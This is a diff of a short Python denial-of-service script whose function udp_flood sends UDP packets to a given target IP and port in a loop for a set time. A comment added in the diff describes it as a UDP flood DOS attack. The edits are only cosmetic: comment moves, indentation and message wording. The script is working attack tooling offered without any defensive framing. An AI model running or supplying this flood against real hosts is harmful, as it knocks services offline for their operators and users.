@@ -1,10 +1,9 @@
-
-
 import socket
 import sys
 import time
 import random
 
+# Mounts a UDP flood DOS attack on specified target for a specified time
 def udp_flood(target_ip, port, t):
 	
 	begin = time.time()
@@ -19,15 +18,16 @@ def udp_flood(target_ip, port, t):
 
 		# Check for end time of attack
 		if end - begin > t:
-			print("Sent %d packets" % (count))
+			print("Sent %d UDP packets" % (count))
 			exit()
+
+		# Send UDP packet
 		try:
-			# Send UDP packet
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			s.sendto(message, (target_ip, port))
 			count = count + 1
 		except:
-				pass
+			pass
 
 		#known bug on BSD systems: Buffer space runs out when mass sending UDP messages
 		#UDP on BSD/OSX does not block or discard packet data when the buffer is full, thus an
